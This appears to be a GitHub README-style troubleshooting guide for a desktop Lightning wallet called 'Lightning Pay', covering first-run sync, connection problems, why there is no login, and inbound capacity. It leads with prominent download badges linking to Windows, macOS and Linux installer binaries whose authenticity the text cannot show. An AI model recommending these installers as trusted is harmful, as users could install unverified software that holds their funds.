<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# First run: syncing, connecting and login problems in Lightning Pay
Most first-run problems are sync, network or expectation. None of them need a reinstall.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

A new wallet has three things to do before it feels working: sync with the network, open or find a
channel, and show an accurate balance. Each stage has its own delay, and each produces a message that
sounds worse than it is.

## Syncing

The wallet has to learn the current state of the network and of its channels. On a first run that takes
longer than on later ones, and after a long time closed it can take a minute or two again.

A balance that reads zero during sync is a balance that has not been read yet. Wait for the sync to
finish before judging it.

## Connecting

"Stuck on connecting" usually means the wallet cannot reach a peer or the network: a firewall, a VPN, a
proxy, or simply a slow connection. Update to [the current release](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1)
first, then try another network, disable a VPN temporarily, and check whether the machine can reach the
internet at all.

Corporate networks that block non-standard traffic are a common cause, and nothing in the wallet can
route around a network that refuses the connection.

## "Login not working"

There is no login. The wallet is local software, so a password prompt belongs to the operating system
or to a wallet encryption feature, not to an account. If a page asks you to log in to your wallet, that
page is not the wallet.

Likewise, there is no password reset, because there is no account. A forgotten encryption password is
recovered with the phrase, and the phrase is the only recovery path.

## A newly funded wallet that cannot receive

Expected on a first receive: no inbound capacity means a channel has to be opened, which is an on-chain
transaction. It takes a confirmation and it costs a fee. That is not a fault; it is the cost of being
reachable.

## When to ask for help

If the sync completes, the network is reachable, the release is current, and the balance is still wrong,
that is a bug report with logs attached. Reinstalling first destroys the evidence and, without a tested
phrase, risks the funds.

## Questions people ask

### Why does the app take so long the first time?

It is syncing state it has never seen. Later launches are faster.

### Do I need to log in anywhere?

No. There is no account, and any page asking for wallet credentials is not this product.

### Should I reinstall to fix a display problem?

No. Diagnose first; reinstall only with a tested phrase.

## Related guides

- [Downloading Lightning Pay on Windows and macOS without getting a fake](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/download-lightning-pay-windows-macos.md)
- [Do you have to manage Lightning channels yourself?](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/manage-lightning-channels.md)
- [Why a Lightning payment fails, sticks or shows a zero balance](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/why-a-lightning-payment-fails-or-sticks.md)

